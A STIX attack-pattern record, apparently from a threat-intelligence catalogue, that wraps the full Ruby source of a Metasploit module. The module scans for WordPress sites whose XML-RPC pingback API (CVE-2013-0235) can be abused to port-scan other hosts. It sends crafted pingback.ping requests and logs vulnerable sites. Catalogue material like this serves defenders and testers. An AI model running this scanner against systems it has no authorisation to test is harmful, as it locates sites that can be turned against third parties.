{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a028decc-74ba-471a-a6ef-af78c23c0dda",
    "created": "2024-08-14T16:31:09.570664Z",
    "modified": "2024-08-14T16:31:09.570684Z",
    "name": "Wordpress Pingback Locator",
    "description": " This module will scan for wordpress sites with the Pingback API enabled. By interfacing with the API an attacker can cause the wordpress site to port scan an external target and return results. Refer to the wordpress_pingback_portscanner module. This issue was fixed in wordpress 3.5.1 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wordpress_pingback_access.rb",
            "external_id": "wordpress_pingback_access.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0235"
        },
        {
            "source_name": "reference",
            "url": "https://bugtraq.securityfocus.com/archive/1/525045/30/30/threaded"
        },
        {
            "source_name": "reference",
            "url": "http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/FireFart/WordpressPingbackPortScanner"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Wordpress Pingback Locator',\n      'Description' => %q{\n          This module will scan for wordpress sites with the Pingback\n          API enabled. By interfacing with the API an attacker can cause\n          the wordpress site to port scan an external target and return\n          results. Refer to the wordpress_pingback_portscanner module.\n          This issue was fixed in wordpress 3.5.1\n        },\n      'Author' =>\n        [\n          'Thomas McCarthy \"smilingraccoon\" <smilingraccoon[at]gmail.com>',\n          'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>' ,\n          'Christian Mehlmauer' # Original PoC\n        ],\n      'License' => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-0235' ],\n          [ 'URL', 'https://bugtraq.securityfocus.com/archive/1/525045/30/30/threaded'],\n          [ 'URL', 'http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/'],\n          [ 'URL', 'https://github.com/FireFart/WordpressPingbackPortScanner']\n        ]\n      ))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [ true, 'The path to wordpress installation (e.g. /wordpress/)', '/'])\n        ])\n\n      register_advanced_options(\n        [\n          OptInt.new('NUM_REDIRECTS', [ true, \"Number of HTTP redirects to follow\", 10])\n        ])\n  end\n\n  def setup()\n    # Check if database is active\n    if db()\n      @db_active = true\n    else\n      @db_active = false\n    end\n  end\n\n  def get_xml_rpc_url(ip)\n    # code to find the xmlrpc url when passed in IP\n    vprint_status(\"#{ip} - Enumerating XML-RPC URI...\")\n\n    begin\n\n      uri = target_uri.path\n      uri << '/' if uri[-1,1] != '/'\n\n      res = send_request_cgi(\n      {\n          'method'\t=> 'HEAD',\n          'uri'\t\t=> \"#{uri}\"\n      })\n      # Check if X-Pingback exists and return value\n      if res\n        if res['X-Pingback']\n          return res['X-Pingback']\n        else\n          vprint_status(\"#{ip} - X-Pingback header not found\")\n          return nil\n        end\n      else\n        return nil\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"#{ip} - Unable to connect\")\n      return nil\n    end\n  end\n\n  # Creates the XML data to be sent\n  def generate_pingback_xml(target, valid_blog_post)\n    xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"iso-8859-1\\\"?>\"\n    xml << \"<methodCall>\"\n    xml << \"<methodName>pingback.ping</methodName>\"\n    xml << \"<params>\"\n    xml << \"<param><value><string>#{target}</string></value></param>\"\n    xml << \"<param><value><string>#{valid_blog_post}</string></value></param>\"\n    xml << \"</params>\"\n    xml << \"</methodCall>\"\n    return xml\n  end\n\n  def get_blog_posts(xml_rpc, ip)\n    # find all blog posts within IP and determine if pingback is enabled\n    blog_posts = wordpress_get_all_blog_posts_via_feed(datastore['NUM_REDIRECTS'])\n    blog_posts.each do |blog_post|\n      pingback_response = get_pingback_request(xml_rpc, 'http://127.0.0.1', blog_post)\n      if pingback_response\n        pingback_disabled_match = pingback_response.body.match(/<value><int>33<\\/int><\\/value>/i)\n        if pingback_response.code == 200 and pingback_disabled_match.nil?\n          print_good(\"#{ip} - Pingback enabled: #{blog_post}\")\n          return blog_post\n        else\n          vprint_status(\"#{ip} - Pingback disabled: #{blog_post}\")\n        end\n      end\n    end\n\n    return nil\n  end\n\n  # method to send xml-rpc requests\n  def get_pingback_request(xml_rpc, target, blog_post)\n    uri = xml_rpc.sub(/.*?#{target}/,\"\")\n    # create xml pingback request\n    pingback_xml = generate_pingback_xml(target, blog_post)\n\n    # Send post request with crafted XML as data\n    begin\n      res = send_request_cgi({\n        'uri'    => \"#{uri}\",\n        'method' => 'POST',\n        'data'\t => \"#{pingback_xml}\"\n        })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Unable to connect to #{uri}\")\n      return nil\n    end\n    return res\n  end\n\n  # Save data to vuln table\n  def store_vuln(ip, blog)\n    report_vuln(\n      :host\t\t=> ip,\n      :proto\t\t=> 'tcp',\n      :port\t\t=> datastore['RPORT'],\n      :name\t\t=> self.name,\n      :info\t\t=> \"Module #{self.fullname} found pingback at #{blog}\",\n      :sname\t\t=> datastore['SSL'] ? \"https\" : \"http\"\n    )\n  end\n\n  # main control method\n  def run_host(ip)\n    unless wordpress_and_online?\n      print_error(\"#{ip} does not seeem to be Wordpress site\")\n      return\n    end\n\n    # call method to get xmlrpc url\n    xmlrpc = get_xml_rpc_url(ip)\n\n    # once xmlrpc url is found, get_blog_posts\n    if xmlrpc.nil?\n      print_error(\"#{ip} - It doesn't appear to be vulnerable\")\n    else\n      hash = get_blog_posts(xmlrpc, ip)\n\n      if hash\n        store_vuln(ip, hash) if @db_active\n      else\n        print_status(\"#{ip} - X-Pingback enabled but no vulnerable blogs found\")\n      end\n    end\n  end\nend\n"
}